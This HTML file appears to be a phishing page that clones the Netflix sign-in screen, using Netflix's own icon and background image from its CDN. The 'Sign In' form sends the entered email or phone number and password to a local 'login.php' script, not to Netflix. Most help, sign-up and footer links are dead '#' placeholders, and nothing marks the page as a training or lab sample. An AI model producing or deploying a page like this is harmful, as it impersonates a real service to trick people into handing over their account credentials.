<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix</title>
    <link rel="icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2023.ico">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background-color: #000;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            color: #fff;
        }
        .bg-image {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(rgba(0,0,0,.7) 0%, rgba(0,0,0,.4) 40%, rgba(0,0,0,.7) 100%),
                        url('https://assets.nflxext.com/ffe/siteui/vlv3/93da5c27-be66-427c-8b72-5cb39d275279/94eb5ad7-10d8-4571-8c62-1fd310521793/US-en-20231120-popsignuptwoithigherqualityimage-x2-generic.jpg') center/cover no-repeat;
            z-index: 0;
        }
        .content { position: relative; z-index: 1; flex: 1; display: flex; flex-direction: column; }
        /* Header */
        .nf-header {
            padding: 20px 32px;
        }
        .nf-logo {
            width: 148px;
            height: 40px;
        }
        /* Main */
        .main-wrapper {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .login-card {
            background: rgba(0,0,0,.75);
            border-radius: 4px;
            padding: 60px 68px 40px;
            width: 100%;
            max-width: 450px;
            min-height: 540px;
        }
        .login-title {
            font-size: 32px;
            font-weight: 700;
            margin-bottom: 28px;
            color: #fff;
        }
        .login-form {
            display: flex;
            flex-direction: column;
            gap: 16px;
        }
        .input-wrapper {
            position: relative;
            background: #333;
            border-radius: 4px;
            border: 1px solid #595959;
            height: 50px;
        }
        .input-wrapper:focus-within {
            border-color: #fff;
        }
        .form-input {
            width: 100%;
            height: 100%;
            background: transparent;
            border: none;
            padding: 16px 16px 0;
            font-size: 16px;
            color: #fff;
            outline: none;
        }
        .input-label {
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 14px;
            color: #8c8c8c;
            transition: all 0.15s ease;
            pointer-events: none;
        }
        .form-input:focus + .input-label,
        .form-input:not(:placeholder-shown) + .input-label {
            top: 8px;
            font-size: 11px;
            transform: none;
        }
        .btn-login {
            width: 100%;
            background-color: #e50914;
            color: #fff;
            border: none;
            border-radius: 4px;
            padding: 16px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: background-color 0.2s;
            margin-top: 8px;
        }
        .btn-login:hover { background-color: #f40612; }
        .remember-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 4px;
        }
        .remember-label {
            display: flex;
            align-items: center;
            gap: 4px;
            font-size: 13px;
            color: #b3b3b3;
            cursor: pointer;
        }
        .remember-label input[type="checkbox"] {
            width: 16px;
            height: 16px;
            accent-color: #b3b3b3;
        }
        .help-link {
            color: #b3b3b3;
            font-size: 13px;
            text-decoration: none;
        }
        .help-link:hover { text-decoration: underline; }
        .signup-text {
            margin-top: 16px;
            font-size: 16px;
            color: #737373;
        }
        .signup-text a {
            color: #fff;
            text-decoration: none;
            font-weight: 500;
        }
        .signup-text a:hover { text-decoration: underline; }
        .captcha-text {
            margin-top: 12px;
            font-size: 13px;
            color: #8c8c8c;
            line-height: 1.5;
        }
        .captcha-text a {
            color: #0071eb;
            text-decoration: none;
        }
        .captcha-text a:hover { text-decoration: underline; }
        /* Footer */
        .nf-footer {
            background: rgba(0,0,0,.75);
            border-top: 1px solid #333;
            padding: 30px 32px 50px;
        }
        .footer-inner {
            max-width: 1000px;
            margin: 0 auto;
        }
        .footer-contact {
            font-size: 14px;
            color: #737373;
            margin-bottom: 20px;
        }
        .footer-contact a { color: #737373; text-decoration: none; }
        .footer-contact a:hover { text-decoration: underline; }
        .footer-links {
            display: flex;
            flex-wrap: wrap;
            gap: 4px 0;
            margin-bottom: 20px;
        }
        .footer-links a {
            color: #737373;
            font-size: 13px;
            text-decoration: none;
            width: 25%;
            padding: 4px 0;
        }
        .footer-links a:hover { text-decoration: underline; }
        .footer-lang select {
            background: transparent;
            border: 1px solid #333;
            color: #737373;
            padding: 8px 32px 8px 12px;
            font-size: 14px;
            border-radius: 0;
            outline: none;
            cursor: pointer;
        }
        .footer-lang select option { background: #000; }
        @media (max-width: 740px) {
            .login-card {
                padding: 32px 20px;
                max-width: 100%;
                min-height: auto;
                background: rgba(0,0,0,.85);
            }
            .login-title { font-size: 24px; }
            .nf-header { padding: 12px 16px; }
            .nf-logo { width: 90px; height: 24px; }
            .footer-links a { width: 50%; }
        }
    </style>
</head>

<div class="bg-image"></div>
<div class="content">
    <header class="nf-header">
        <svg class="nf-logo" viewBox="0 0 111 30" xmlns="http://www.w3.org/2000/svg">

        </svg>
    </header>

    <div class="main-wrapper">
        <div class="login-card">
            <h1 class="login-title">Sign In</h1>
            <form class="login-form" action="login.php" method="POST" autocomplete="off">
                <div class="input-wrapper">
                    <input type="text" name="username" class="form-input" placeholder=" " required id="email">
                    <label class="input-label" for="email">Email or mobile number</label>
                </div>
                <div class="input-wrapper">
                    <input type="password" name="password" class="form-input" placeholder=" " required id="password">
                    <label class="input-label" for="password">Password</label>
                </div>
                <button type="submit" class="btn-login">Sign In</button>
            </form>
            <div class="remember-row">
                <label class="remember-label"><input type="checkbox" checked> Remember me</label>
                <a class="help-link" href="#">Need help?</a>
            </div>
            <p class="signup-text">New to Netflix? <a href="#">Sign up now</a>.</p>
            <p class="captcha-text">This page is protected by Google reCAPTCHA to ensure you're not a bot. <a href="#">Learn more.</a></p>
        </div>
    </div>

    <footer class="nf-footer">
        <div class="footer-inner">
            <p class="footer-contact">Questions? Call <a href="#">0808-196-5391</a></p>
            <div class="footer-links">

                <a href="#">Privacy</a>
                <a href="#">Cookie Preferences</a>
                <a href="#">Corporate Information</a>
            </div>
            <div class="footer-lang">
                <select>
                    <option>English</option>
                    <option>Español</option>
                    <option>Français</option>
                    <option>Deutsch</option>
                    <option>日本語</option>
                    <option>한국어</option>
                    <option>العربية</option>
                </select>
            </div>
        </div>
    </footer>
</div>
</body>
</html>
